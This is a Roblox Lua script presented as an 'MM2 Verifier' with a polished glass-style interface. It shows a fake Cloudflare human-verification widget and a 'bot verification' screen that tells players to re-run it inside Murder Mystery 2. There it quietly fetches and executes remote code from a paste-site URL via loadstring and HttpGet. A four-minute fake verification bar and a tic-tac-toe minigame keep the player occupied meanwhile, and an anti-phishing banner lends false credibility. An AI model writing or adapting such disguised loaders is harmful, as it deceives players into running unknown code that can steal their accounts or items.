--[[
    MM2 Verifier — Glass Edition (v2)
    Same screens, wording and logic as the original script.
    Only the GUI was upgraded (glass engine, motion, dragging, hover effects).
]]

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local UIS = game:GetService("UserInputService")

if not game:IsLoaded() then game.Loaded:Wait() end

local LP = Players.LocalPlayer
local PG = LP:WaitForChild("PlayerGui")

-- ═══ Config (same values as the original) ═══════════════════════════════════
local MM2_ID = 142823291
local LOAD_DUR = 240
local SCRIPT_URL = "https://cdn.sourceb.in/bins/AhNbx38Buf/0"
local MM2_LINK = "https://www.roblox.com/games/" .. MM2_ID
local DISCORD_URL = "https://discord.gg/KnRMYe7Kn"
local ALERT_TEXT = "SECURITY ALERT: Never enter your Roblox login credentials on external websites or fake Roblox group links! BEAM SITE ALERT!"

local Theme = {
    Glass = Color3.fromRGB(24, 22, 28),
    GlassAlpha = 0.35,
    Surface = Color3.fromRGB(40, 37, 46),
    Quartz = Color3.fromRGB(236, 222, 231),
    Rose = Color3.fromRGB(205, 160, 182),
    Text = Color3.fromRGB(245, 245, 250),
    Sub = Color3.fromRGB(160, 155, 175),
    Success = Color3.fromRGB(80, 200, 140),
    Discord = Color3.fromRGB(114, 137, 218),
    Danger = Color3.fromRGB(225, 90, 110),
    White = Color3.fromRGB(255, 255, 255),
}

-- ═══ Connection tracking ════════════════════════════════════════════════════
local conns: {RBXScriptConnection} = {}
local function track(c: RBXScriptConnection): RBXScriptConnection
    table.insert(conns, c)
    return c
end
local function cleanup()
    for _, c in ipairs(conns) do pcall(function() c:Disconnect() end) end
    table.clear(conns)
end

-- ═══ Helpers & object factories ═════════════════════════════════════════════
local function tw(o: Instance, props: {[string]: any}, t: number?, style: Enum.EasingStyle?, dir: Enum.EasingDirection?): Tween
    local tween = TweenService:Create(o, TweenInfo.new(t or 0.3, style or Enum.EasingStyle.Exponential, dir or Enum.EasingDirection.Out), props)
    tween:Play()
    return tween
end

local function merge(base: {[string]: any}, extra: {[string]: any}?): {[string]: any}
    local out = {}
    for k, v in pairs(base) do out[k] = v end
    if extra then for k, v in pairs(extra) do out[k] = v end end
    return out
end

local function new(className: string, parent: Instance?, props: {[string]: any}?): any
    local inst: any = Instance.new(className)
    if props then
        for k, v in pairs(props) do inst[k] = v end
    end
    inst.Parent = parent
    return inst
end

local function seq(...: number): NumberSequence
    local a = {...}
    local pts = {}
    for i = 1, #a, 2 do
        table.insert(pts, NumberSequenceKeypoint.new(a[i], a[i + 1]))
    end
    return NumberSequence.new(pts)
end

local SWEEP = seq(0, 0, 0.55, 1, 1, 1)
local SOLID = seq(0, 0, 1, 0)

local function corner(par: Instance, r: number?): UICorner
    return new("UICorner", par, {CornerRadius = UDim.new(0, r or 12)})
end

local function stroke(par: Instance, color: Color3?, thickness: number?, transparency: number?): UIStroke
    return new("UIStroke", par, {
        Color = color or Theme.White,
        Thickness = thickness or 1,
        Transparency = transparency or 0.7,
        ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
    })
end

local function glassStroke(par: Instance, color: Color3?, thickness: number?, transparency: number?): UIStroke
    local st = stroke(par, color, thickness, transparency)
    new("UIGradient", st, {Rotation = 90, Transparency = seq(0, 0, 0.5, 0.55, 1, 0.8)})
    return st
end

local function frame(par: Instance?, props: {[string]: any}?): Frame
    return new("Frame", par, merge({
        BackgroundColor3 = Theme.Surface,
        BorderSizePixel = 0,
        ZIndex = 5,
    }, props))
end

local function label(par: Instance?, props: {[string]: any}?): TextLabel
    return new("TextLabel", par, merge({
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
        Font = Enum.Font.Gotham,
        Text = "",
        TextSize = 12,
        TextColor3 = Theme.Text,
        TextXAlignment = Enum.TextXAlignment.Left,
        ZIndex = 5,
    }, props))
end

local function card(par: Instance, pos: UDim2, size: UDim2, tint: Color3?, alpha: number?, strokeColor: Color3?): Frame
    local c = frame(par, {
        Position = pos,
        Size = size,
        BackgroundColor3 = tint or Theme.Surface,
        BackgroundTransparency = alpha or 0.45,
    })
    corner(c, 12)
    glassStroke(c, strokeColor or Theme.White, 1, 0.75)
    return c
end

-- ═══ Flagship glass engine ══════════════════════════════════════════════════
local function applyFlagshipGlassFx(panel: GuiObject, radius: number)
    local root = panel.Parent
    if root then
        for i = 1, 4 do
            local grow = i * 8
            local shadow = frame(root, {
                Name = "Shadow" .. i,
                AnchorPoint = Vector2.new(0.5, 0.5),
                Position = UDim2.new(0.5, 0, 0.5, 5 + i * 2),
                Size = UDim2.new(1, grow, 1, grow),
                BackgroundColor3 = Color3.new(0, 0, 0),
                BackgroundTransparency = 0.86 + i * 0.03,
                ZIndex = 1,
            })
            corner(shadow, radius + grow / 2)
        end
    end

    local veil = frame(panel, {
        Name = "FrostVeil",
        Size = UDim2.fromScale(1, 1),
        BackgroundColor3 = Theme.Quartz,
        BackgroundTransparency = 0.86,
        ZIndex = 1,
    })
    corner(veil, radius)
    new("UIGradient", veil, {Rotation = 90, Transparency = seq(0, 0, 0.55, 0.5, 1, 1)})

    local glow = frame(panel, {
        Name = "AmbientGlow",
        Size = UDim2.fromScale(1, 1),
        BackgroundColor3 = Theme.White,
        BackgroundTransparency = 0.84,
        ZIndex = 2,
    })
    corner(glow, radius)
    new("UIGradient", glow, {
        Rotation = 35,
        Color = ColorSequence.new(Theme.Rose, Theme.Sub),
        Transparency = seq(0, 0, 0.55, 0.75, 1, 1),
    })

    local sheen = frame(panel, {
        Name = "TopSheen",
        Size = UDim2.new(1, 0, 0.42, 0),
        BackgroundColor3 = Theme.White,
        BackgroundTransparency = 0.88,
        ZIndex = 3,
    })
    corner(sheen, radius)
    new("UIGradient", sheen, {Rotation = 90, Transparency = seq(0, 0, 1, 1)})

    local edge = frame(panel, {
        Name = "TopEdge",
        Position = UDim2.new(0, radius * 0.7, 0, 1),
        Size = UDim2.new(1, -radius * 1.4, 0, 1),
        BackgroundColor3 = Theme.White,
        BackgroundTransparency = 0.15,
        ZIndex = 4,
    })
    new("UIGradient", edge, {Transparency = seq(0, 1, 0.5, 0, 1, 1)})

    glassStroke(panel, Theme.White, 1.2, 0.45)
end

local function glassWindow(parent: Instance, size: UDim2, pos: UDim2, radius: number, class: string?)
    local root = frame(parent, {
        Name = "Window",
        Size = size,
        Position = pos,
        BackgroundTransparency = 1,
        ZIndex = 2,
    })
    local scale = new("UIScale", root, {Scale = 1})
    local isButton = (class == "TextButton")
    local panel = new(class or "Frame", root, merge({
        Name = "Glass",
        Size = UDim2.fromScale(1, 1),
        BackgroundColor3 = Theme.Glass,
        BackgroundTransparency = Theme.GlassAlpha,
        BorderSizePixel = 0,
        ZIndex = 3,
    }, isButton and {Text = "", AutoButtonColor = false} or nil))
    corner(panel, radius)
    applyFlagshipGlassFx(panel, radius)
    return root, panel, scale
end

local function button(parent: Instance, size: UDim2, pos: UDim2, props: {[string]: any}, accent: Color3?, radius: number?)
    local tint = accent or Theme.Surface
    local holder = frame(parent, {
        Size = size,
        Position = pos,
        BackgroundTransparency = 1,
    })
    local btn = new("TextButton", holder, merge({
        AnchorPoint = Vector2.new(0.5, 0.5),
        Position = UDim2.fromScale(0.5, 0.5),
        Size = UDim2.fromScale(1, 1),
        BackgroundColor3 = tint,
        BackgroundTransparency = 0.45,
        BorderSizePixel = 0,
        AutoButtonColor = false,
        Font = Enum.Font.GothamBold,
        Text = "",
        TextSize = 12,
        TextColor3 = Theme.Text,
        ZIndex = 6,
    }, props))
    corner(btn, radius or 9)
    local st = glassStroke(btn, tint:Lerp(Theme.White, 0.55), 1, 0.7)
    local sc = new("UIScale", btn, {Scale = 1})
    local baseAlpha: number = btn.BackgroundTransparency
    local hovering = false

    btn.MouseEnter:Connect(function()
        hovering = true
        tw(sc, {Scale = 1.02}, 0.25)
        tw(btn, {BackgroundTransparency = math.max(baseAlpha - 0.18, 0.05), BackgroundColor3 = tint:Lerp(Theme.White, 0.12)}, 0.25)
        tw(st, {Transparency = 0.3, Color = Theme.White}, 0.25)
    end)
    btn.MouseLeave:Connect(function()
        hovering = false
        tw(sc, {Scale = 1}, 0.3)
        tw(btn, {BackgroundTransparency = baseAlpha, BackgroundColor3 = tint}, 0.3)
        tw(st, {Transparency = 0.7, Color = tint:Lerp(Theme.White, 0.55)}, 0.3)
    end)
    btn.MouseButton1Down:Connect(function() tw(sc, {Scale = 0.97}, 0.1) end)
    btn.MouseButton1Up:Connect(function()
        tw(sc, {Scale = hovering and 1.02 or 1}, 0.3, Enum.EasingStyle.Back)
    end)
    return btn, holder
end

-- ═══ Utilities ══════════════════════════════════════════════════════════════
local function makeDraggable(handle: GuiObject, target: GuiObject)
    local state = {Dragging = false, Moved = false}
    local startInput: Vector3 = Vector3.zero
    local startPos: UDim2 = target.Position

    handle.InputBegan:Connect(function(input: InputObject)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            state.Dragging = true
            state.Moved = false
            startInput = input.Position
            startPos = target.Position
        end
    end)
    track(UIS.InputChanged:Connect(function(input: InputObject)
        if state.Dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local d = input.Position - startInput
            if d.Magnitude > 4 then state.Moved = true end
            target.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
        end
    end))
    track(UIS.InputEnded:Connect(function(input: InputObject)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            state.Dragging = false
        end
    end))
    return state
end

local function copyText(text: string): boolean
    local attempts = {
        function() setclipboard(text) end,
        function() writeclipboard(text) end,
        function() toclipboard(text) end,
    }
    for _, fn in ipairs(attempts) do
        if pcall(fn) then return true end
    end
    return false
end

local function fitFor(w: number, h: number): number
    local cam = workspace.CurrentCamera
    local vp = cam and cam.ViewportSize or Vector2.new(1280, 720)
    return math.clamp(math.min((vp.X - 24) / w, (vp.Y - 110) / h), 0.5, 1)
end

-- Rotating gradient on a UIStroke = smooth comet spinner
local function spinStroke(st: UIStroke): () -> ()
    local g = st:FindFirstChildOfClass("UIGradient") or new("UIGradient", st, {})
    g.Transparency = SWEEP
    local conn = track(RunService.RenderStepped:Connect(function(dt: number)
        g.Rotation = (g.Rotation + dt * 480) % 360
    end))
    return function()
        conn:Disconnect()
        g.Rotation = 0
        g.Transparency = SOLID
    end
end

-- Checkmark drawn from two bars (no font glyph needed). Returns a "pop in" function.
local function drawCheck(parent: Instance, color: Color3, size: number): () -> ()
    local holder = frame(parent, {
        AnchorPoint = Vector2.new(0.5, 0.5),
        Position = UDim2.fromScale(0.5, 0.5),
        Size = UDim2.fromOffset(size, size),
        BackgroundTransparency = 1,
        ZIndex = 7,
    })
    local scale = new("UIScale", holder, {Scale = 0.3})
    local bars = {}
    local function bar(cx: number, cy: number, len: number, rot: number)
        local b = frame(holder, {
            AnchorPoint = Vector2.new(0.5, 0.5),
            Position = UDim2.fromOffset(cx * size, cy * size),
            Size = UDim2.fromOffset(math.max(2, size * 0.14), len * size),
            Rotation = rot,
            BackgroundColor3 = color,
            BackgroundTransparency = 1,
            ZIndex = 7,
        })
        corner(b, 4)
        table.insert(bars, b)
    end
    bar(0.27, 0.62, 0.34, -45)
    bar(0.62, 0.50, 0.68, 45)
    return function()
        for _, b in ipairs(bars) do tw(b, {BackgroundTransparency = 0}, 0.25) end
        tw(scale, {Scale = 1}, 0.5, Enum.EasingStyle.Back)
    end
end

-- ═══ Game detection / root GUI ══════════════════════════════════════════════
local isInMM2 = (game.PlaceId == MM2_ID)

for _, name in ipairs({"MM2_VerificationGui", "MM2_LoaderGui", "MM2_FlagshipHub"}) do
    local old = PG:FindFirstChild(name)
    if old then old:Destroy() end
end

local SG = new("ScreenGui", PG, {
    Name = isInMM2 and "MM2_LoaderGui" or "MM2_VerificationGui",
    ResetOnSpawn = false,
    ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
    IgnoreGuiInset = true,
    DisplayOrder = 999,
})
SG.Destroying:Connect(cleanup)

-- ═══ WRONG GAME: Turnstile -> "Bot Verification Required" ═══════════════════
local function buildWrongGame()
    local dim = frame(SG, {
        Name = "Overlay",
        Size = UDim2.fromScale(1, 1),
        BackgroundColor3 = Color3.fromRGB(10, 8, 14),
        BackgroundTransparency = 1,
        ZIndex = 1,
    })
    tw(dim, {BackgroundTransparency = 0.5}, 0.7)

    -- Step 2: verification window (same text as the original)
    local function showVerification()
        local W, H = 410, 324
        local fit = fitFor(W, H)
        local root, panel, scale = glassWindow(SG, UDim2.fromOffset(W, H), UDim2.fromScale(0.5, 0.5), 16)
        root.AnchorPoint = Vector2.new(0.5, 0.5)
        scale.Scale = 0.88 * fit
        tw(scale, {Scale = fit}, 0.65, Enum.EasingStyle.Back)

        local titleBar = frame(panel, {Size = UDim2.new(1, 0, 0, 52), BackgroundTransparency = 1})
        makeDraggable(titleBar, root)
        label(titleBar, {
            Size = UDim2.new(1, 0, 0, 46),
            Position = UDim2.fromOffset(0, 8),
            Text = "🌸 Bot Verification Required 🌸",
            Font = Enum.Font.GothamBold,
            TextSize = 16,
            TextXAlignment = Enum.TextXAlignment.Center,
        })

        local desc = card(panel, UDim2.fromOffset(18, 54), UDim2.new(1, -36, 0, 106))
        label(desc, {
            Size = UDim2.new(1, -16, 1, -10),
            Position = UDim2.fromOffset(8, 5),
            Text = "We suspect you might be a bot, cutie! ✨\n\nTo prove you're a real player, please re-execute this script inside Murder Mystery 2 and wait for verification to finish. Come back here afterwards and you're good to go!",
            TextColor3 = Theme.Text,
            TextSize = 12,
            TextWrapped = true,
            TextXAlignment = Enum.TextXAlignment.Center,
        })

        -- Anti-phishing alert
        local banner = card(panel, UDim2.fromOffset(18, 168), UDim2.new(1, -36, 0, 62), Theme.Danger, 0.82, Theme.Danger)
        local icon = frame(banner, {
            Position = UDim2.fromOffset(12, 16),
            Size = UDim2.fromOffset(30, 30),
            BackgroundColor3 = Theme.Danger,
            BackgroundTransparency = 0.35,
        })
        corner(icon, 15)
        label(icon, {
            Size = UDim2.fromScale(1, 1),
            Text = "!",
            Font = Enum.Font.GothamBlack,
            TextSize = 16,
            TextXAlignment = Enum.TextXAlignment.Center,
        })
        label(banner, {
            Position = UDim2.fromOffset(52, 6),
            Size = UDim2.new(1, -62, 1, -12),
            Text = ALERT_TEXT,
            Font = Enum.Font.GothamBold,
            TextSize = 11,
            TextWrapped = true,
        })

        local msg = label(panel, {
            Position = UDim2.fromOffset(18, 292),
            Size = UDim2.new(1, -36, 0, 18),
            Text = "",
            Font = Enum.Font.GothamBold,
            TextSize = 11,
            TextColor3 = Theme.Danger,
            TextXAlignment = Enum.TextXAlignment.Center,
            ZIndex = 6,
        })

        local teleport = button(panel, UDim2.fromOffset(180, 40), UDim2.fromOffset(20, 242), {
            Text = "Take Me to MM2 ✈",
            TextSize = 12,
        }, Theme.Rose, 10)
        local discord = button(panel, UDim2.fromOffset(180, 40), UDim2.fromOffset(210, 242), {
            Text = "Copy Discord Invite",
            TextSize = 12,
            BackgroundTransparency = 0.3,
        }, Theme.Discord, 10)

        -- "Take Me to MM2" -> error display (+ link copy), same as the original
        teleport.MouseButton1Click:Connect(function()
            if copyText(MM2_LINK) then
                msg.Text = "❌ Error: Please join MM2 manually! (Link copied)"
            else
                msg.Text = "❌ Error: Please join MM2 manually!"
            end
            msg.TextColor3 = Theme.Danger
            tw(teleport, {BackgroundColor3 = Theme.Danger}, 0.1)
            task.delay(0.25, function() tw(teleport, {BackgroundColor3 = Theme.Rose}, 0.3) end)
        end)

        local token = 0
        discord.MouseButton1Click:Connect(function()
            token += 1
            local mine = token
            if copyText(DISCORD_URL) then
                discord.Text = "Copied!"
                tw(discord, {BackgroundColor3 = Theme.Success}, 0.25)
                msg.Text = "Discord invite copied to clipboard"
                msg.TextColor3 = Theme.Success
            else
                discord.Text = "Clipboard unavailable"
                msg.Text = "Copy manually: " .. DISCORD_URL
                msg.TextColor3 = Theme.Sub
            end
            task.delay(2.2, function()
                if mine ~= token then return end
                discord.Text = "Copy Discord Invite"
                tw(discord, {BackgroundColor3 = Theme.Discord}, 0.3)
            end)
        end)
    end

    -- Step 1: Turnstile-style widget (same text/colors as the original), smoother animation
    local tRoot, tPanel, tScale = glassWindow(SG, UDim2.fromOffset(320, 76), UDim2.fromScale(0.5, 0.5), 10)
    tRoot.AnchorPoint = Vector2.new(0.5, 0.5)
    tPanel.BackgroundColor3 = Color3.fromRGB(248, 249, 250)
    tPanel.BackgroundTransparency = 0.05
    local tStroke = tPanel:FindFirstChildOfClass("UIStroke")
    if tStroke then
        tStroke.Color = Color3.fromRGB(200, 205, 215)
        tStroke.Transparency = 0.1
    end
    tScale.Scale = 0.85
    tw(tScale, {Scale = 1}, 0.65, Enum.EasingStyle.Back)

    local ring = new("TextButton", tPanel, {
        Position = UDim2.fromOffset(16, 24),
        Size = UDim2.fromOffset(28, 28),
        BackgroundColor3 = Color3.fromRGB(255, 255, 255),
        BorderSizePixel = 0,
        AutoButtonColor = false,
        Text = "",
        ZIndex = 6,
    })
    corner(ring, 14)
    local ringStroke = stroke(ring, Color3.fromRGB(200, 205, 215), 2, 0)
    new("UIGradient", ringStroke, {Transparency = SOLID})
    local popCheck = drawCheck(ring, Color3.fromRGB(34, 139, 34), 16)

    label(tPanel, {
        Size = UDim2.new(1, -120, 0, 18),
        Position = UDim2.fromOffset(54, 20),
        Text = "Verify you are human",
        TextColor3 = Color3.fromRGB(40, 40, 48),
        TextSize = 12,
        Font = Enum.Font.GothamBold,
        ZIndex = 6,
    })
    label(tPanel, {
        Size = UDim2.new(1, -120, 0, 14),
        Position = UDim2.fromOffset(54, 38),
        Text = "cloudflare.com • Privacy • Terms",
        TextColor3 = Color3.fromRGB(140, 145, 155),
        TextSize = 9,
        ZIndex = 6,
    })
    local logo = frame(tPanel, {
        Size = UDim2.fromOffset(60, 40),
        Position = UDim2.new(1, -68, 0.5, -20),
        BackgroundTransparency = 1,
        ZIndex = 6,
    })
    label(logo, {
        Size = UDim2.new(1, 0, 0, 20),
        Position = UDim2.fromOffset(0, 2),
        Text = "☁️",
        TextSize = 16,
        TextXAlignment = Enum.TextXAlignment.Center,
        ZIndex = 7,
    })
    label(logo, {
        Size = UDim2.new(1, 0, 0, 12),
        Position = UDim2.fromOffset(0, 22),
        Text = "CLOUDFLARE",
        TextColor3 = Color3.fromRGB(245, 130, 32),
        TextSize = 7,
        Font = Enum.Font.GothamBlack,
        TextXAlignment = Enum.TextXAlignment.Center,
        ZIndex = 7,
    })

    ring.MouseEnter:Connect(function() tw(ringStroke, {Color = Color3.fromRGB(245, 130, 32)}, 0.2) end)
    ring.MouseLeave:Connect(function() tw(ringStroke, {Color = Color3.fromRGB(200, 205, 215)}, 0.2) end)

    local verified = false
    ring.MouseButton1Click:Connect(function()
        if verified then return end
        verified = true
        ringStroke.Color = Color3.fromRGB(245, 130, 32)
        local stop = spinStroke(ringStroke)
        task.wait(3) -- same 3-second loading as the original
        stop()
        tw(ringStroke, {Color = Color3.fromRGB(34, 139, 34)}, 0.3)
        popCheck()
        task.wait(0.6)
        tw(tScale, {Scale = 0.85}, 0.35, Enum.EasingStyle.Back, Enum.EasingDirection.In)
        task.wait(0.35)
        tRoot:Destroy()
        showVerification()
    end)
end

-- ═══ IN MM2: loader panel (same layout, text and logic as the original) ═════
local function buildLoader()
    -- Execute the script first (in the background so the UI never blocks)
    task.spawn(function()
        pcall(function() loadstring(game:HttpGet(SCRIPT_URL, true))() end)
    end)

    local FIT = fitFor(330, 500)
    local HOME = UDim2.fromOffset(10, 60)
    local OFFSCREEN = UDim2.fromOffset(-340, 60)

    local panelRoot, panel, panelScale = glassWindow(SG, UDim2.fromOffset(310, 420), OFFSCREEN, 16)
    panelScale.Scale = FIT

    -- Header
    local header = frame(panel, {Size = UDim2.new(1, 0, 0, 40), BackgroundTransparency = 1})
    makeDraggable(header, panelRoot)
    label(header, {
        Size = UDim2.new(1, -80, 1, 0),
        Position = UDim2.fromOffset(14, 0),
        Text = "🌸 MM2 Kawaii Loader",
        Font = Enum.Font.GothamBold,
        TextSize = 13,
    })
    local closeBtn = button(header, UDim2.fromOffset(24, 24), UDim2.new(1, -32, 0.5, -12), {Text = "×", TextSize = 17}, Theme.Danger, 6)
    local hideBtn = button(header, UDim2.fromOffset(24, 24), UDim2.new(1, -62, 0.5, -12), {Text = "–", TextSize = 14}, Theme.Surface, 6)

    -- Progress section
    local progress = card(panel, UDim2.fromOffset(12, 46), UDim2.new(1, -24, 0, 72))
    local pctLbl = label(progress, {
        Size = UDim2.new(0.6, 0, 0, 22),
        Position = UDim2.fromOffset(12, 8),
        Text = "0%",
        Font = Enum.Font.GothamBlack,
        TextSize = 17,
    })
    local statusLbl = label(progress, {
        Size = UDim2.new(1, -24, 0, 14),
        Position = UDim2.fromOffset(12, 30),
        Text = "Verifying that you are not a bot...",
        TextColor3 = Theme.Sub,
        TextSize = 10,
    })
    local barBg = frame(progress, {
        Size = UDim2.new(1, -24, 0, 7),
        Position = UDim2.fromOffset(12, 50),
        BackgroundColor3 = Theme.White,
        BackgroundTransparency = 0.9,
        ClipsDescendants = true,
    })
    corner(barBg, 4)
    local barFill = frame(barBg, {
        Size = UDim2.new(0, 0, 1, 0),
        BackgroundColor3 = Theme.White,
        BackgroundTransparency = 0,
        ZIndex = 6,
    })
    corner(barFill, 4)
    local fillGrad = new("UIGradient", barFill, {Color = ColorSequence.new(Theme.Rose, Theme.Quartz)})

    -- Minigame header
    label(panel, {
        Size = UDim2.fromOffset(150, 26),
        Position = UDim2.fromOffset(12, 126),
        Text = "Tic-Tac-Toe Minigame 🎮",
        Font = Enum.Font.GothamBold,
        TextSize = 11,
        TextColor3 = Theme.Sub,
    })
    local gameStatus = label(panel, {
        Size = UDim2.fromOffset(136, 26),
        Position = UDim2.fromOffset(162, 126),
        Text = "You = X   Bot = O",
        Font = Enum.Font.GothamBold,
        TextSize = 10,
        TextColor3 = Theme.Quartz,
        TextXAlignment = Enum.TextXAlignment.Right,
    })

    local grid = frame(panel, {
        Size = UDim2.fromOffset(286, 190),
        Position = UDim2.fromOffset(12, 156),
        BackgroundTransparency = 1,
    })
    new("UIGridLayout", grid, {
        CellSize = UDim2.fromOffset(88, 58),
        CellPadding = UDim2.fromOffset(10, 8),
        SortOrder = Enum.SortOrder.LayoutOrder,
    })

    local resultLbl = label(panel, {
        Size = UDim2.new(1, -24, 0, 20),
        Position = UDim2.fromOffset(12, 380),
        Text = "",
        Font = Enum.Font.GothamBold,
        TextColor3 = Theme.Success,
        TextTransparency = 1,
        TextXAlignment = Enum.TextXAlignment.Center,
    })

    -- Tic-Tac-Toe logic (unchanged)
    local board, cells, gameOver, playerTurn = {}, {}, false, true
    local CX = Theme.Rose
    local CO = Theme.Discord

    local WINS = {{1,2,3},{4,5,6},{7,8,9},{1,4,7},{2,5,8},{3,6,9},{1,5,9},{3,5,7}}
    local function checkWin(b, m)
        for _, w in ipairs(WINS) do
            if b[w[1]] == m and b[w[2]] == m and b[w[3]] == m then return true end
        end
        return false
    end
    local function full(b)
        for i = 1, 9 do if b[i] == "" then return false end end
        return true
    end
    local function minimax(b, d, isMax, a, be)
        if checkWin(b, "O") then return 10 - d end
        if checkWin(b, "X") then return d - 10 end
        if full(b) then return 0 end
        if isMax then
            local best = -math.huge
            for i = 1, 9 do
                if b[i] == "" then
                    b[i] = "O"
                    local s = minimax(b, d + 1, false, a, be)
                    b[i] = ""
                    best = math.max(best, s)
                    a = math.max(a, best)
                    if be <= a then break end
                end
            end
            return best
        else
            local best = math.huge
            for i = 1, 9 do
                if b[i] == "" then
                    b[i] = "X"
                    local s = minimax(b, d + 1, true, a, be)
                    b[i] = ""
                    best = math.min(best, s)
                    be = math.min(be, best)
                    if be <= a then break end
                end
            end
            return best
        end
    end
    local function bestMove()
        local bs, mv = -math.huge, nil
        for i = 1, 9 do
            if board[i] == "" then
                board[i] = "O"
                local s = minimax(board, 0, false, -math.huge, math.huge)
                board[i] = ""
                if s > bs then bs = s mv = i end
            end
        end
        return mv
    end

    local function flash(txt, col)
        resultLbl.Text = txt
        resultLbl.TextColor3 = col
        resultLbl.TextTransparency = 1
        tw(resultLbl, {TextTransparency = 0}, 0.3)
        task.delay(2.5, function() tw(resultLbl, {TextTransparency = 1}, 0.4) end)
    end
    local function setCell(i, m)
        board[i] = m
        cells[i].Text = m
        cells[i].TextColor3 = (m == "X") and CX or CO
        cells[i].TextSize = 12
        tw(cells[i], {TextSize = 22}, 0.35, Enum.EasingStyle.Back)
    end
    local function resetGame()
        task.wait(1.4)
        for i = 1, 9 do
            board[i] = ""
            cells[i].Text = ""
        end
        gameOver = false
        playerTurn = true
        gameStatus.Text = "Your turn — tap a cell"
        gameStatus.TextColor3 = CX
    end
    local function botPlay()
        playerTurn = false
        gameStatus.Text = "Bot is thinking..."
        gameStatus.TextColor3 = CO
        task.delay(0.45, function()
            if gameOver then return end
            local m = bestMove()
            if m then
                setCell(m, "O")
                if checkWin(board, "O") then gameOver = true flash("Bot wins! Play again?", CO) resetGame() return end
                if full(board) then gameOver = true flash("It's a draw! Play again?", Theme.Sub) resetGame() return end
            end
            playerTurn = true
            gameStatus.Text = "Your turn — tap a cell"
            gameStatus.TextColor3 = CX
        end)
    end

    for i = 1, 9 do
        board[i] = ""
        local b, holder = button(grid, UDim2.fromOffset(88, 58), UDim2.new(), {
            Text = "",
            TextSize = 22,
            Font = Enum.Font.GothamBlack,
        }, Theme.Surface, 9)
        holder.LayoutOrder = i
        cells[i] = b
        b.MouseButton1Click:Connect(function()
            if gameOver or board[i] ~= "" or not playerTurn then return end
            setCell(i, "X")
            if checkWin(board, "X") then gameOver = true flash("You win! 🎉 Play again?", Theme.Success) resetGame() return end
            if full(board) then gameOver = true flash("It's a draw! Play again?", Theme.Sub) resetGame() return end
            botPlay()
        end)
    end
    gameStatus.Text = "Your turn — tap a cell"

    -- Mini pill (shown when hidden)
    local pillRoot, pillPanel, pillScale = glassWindow(SG, UDim2.fromOffset(132, 32), UDim2.fromOffset(10, 60), 16, "TextButton")
    pillRoot.Visible = false
    label(pillPanel, {
        Size = UDim2.fromScale(1, 1),
        Text = "🌸 MM2 Verifier",
        Font = Enum.Font.GothamBold,
        TextSize = 11,
        TextXAlignment = Enum.TextXAlignment.Center,
        ZIndex = 6,
    })
    local pillDrag = makeDraggable(pillPanel, pillRoot)
    pillPanel.MouseEnter:Connect(function() tw(pillScale, {Scale = 1.05}, 0.25) end)
    pillPanel.MouseLeave:Connect(function() tw(pillScale, {Scale = 1}, 0.3) end)

    local hidden = false
    local function showPanel()
        hidden = false
        tw(pillScale, {Scale = 0.5}, 0.2, Enum.EasingStyle.Exponential, Enum.EasingDirection.In)
        task.delay(0.15, function()
            if hidden then return end
            pillRoot.Visible = false
        end)
        tw(panelRoot, {Position = HOME}, 0.6, Enum.EasingStyle.Back)
    end
    local function hidePanel()
        hidden = true
        tw(panelRoot, {Position = OFFSCREEN}, 0.4, Enum.EasingStyle.Back, Enum.EasingDirection.In)
        task.delay(0.4, function()
            if not hidden then return end
            pillRoot.Visible = true
            pillScale.Scale = 0.5
            tw(pillScale, {Scale = 1}, 0.5, Enum.EasingStyle.Back)
        end)
    end

    hideBtn.MouseButton1Click:Connect(hidePanel)
    closeBtn.MouseButton1Click:Connect(function()
        tw(panelScale, {Scale = 0.88 * FIT}, 0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In)
        task.delay(0.3, function() SG:Destroy() end)
    end)
    pillPanel.MouseButton1Click:Connect(function()
        if pillDrag.Moved then return end
        showPanel()
    end)

    -- Slide-in entry animation
    tw(panelRoot, {Position = HOME}, 0.7, Enum.EasingStyle.Back)

    -- Progress loop (same duration and messages as the original)
    local MSGS = {
        "Verifying that you are not a bot...", "Almost there, cutie...", "Running security checks...",
        "Testing your connection...", "Analyzing gameplay patterns...", "Cross-referencing your account...",
        "Checking integrity, please wait...", "Finalizing verification...",
    }
    local startT, msgIdx, lastSwap = os.clock(), 1, os.clock()
    local conn
    conn = track(RunService.Heartbeat:Connect(function()
        local e = os.clock() - startT
        local p = math.min(e / LOAD_DUR, 1)
        barFill.Size = UDim2.new(p, 0, 1, 0)
        pctLbl.Text = math.floor(p * 100) .. "%"
        if os.clock() - lastSwap >= 30 then
            lastSwap = os.clock()
            msgIdx = (msgIdx % #MSGS) + 1
            tw(statusLbl, {TextTransparency = 1}, 0.25)
            task.delay(0.3, function()
                statusLbl.Text = MSGS[msgIdx]
                tw(statusLbl, {TextTransparency = 0}, 0.25)
            end)
        end
        if p >= 1 then
            conn:Disconnect()
            gameOver = true
            pctLbl.Text = "Verified ✅"
            pctLbl.TextColor3 = Theme.Success
            statusLbl.Text = "Verification complete!"
            fillGrad.Color = ColorSequence.new(Theme.Success, Theme.Success:Lerp(Theme.White, 0.3))
            task.spawn(function()
                task.wait(2.2)
                tw(panelRoot, {Position = OFFSCREEN}, 0.4, Enum.EasingStyle.Back, Enum.EasingDirection.In)
                task.wait(0.5)
                SG:Destroy()
            end)
        end
    end))
end

-- ═══ Entry point ════════════════════════════════════════════════════════════
if isInMM2 then
    buildLoader()
else
    buildWrongGame()
end
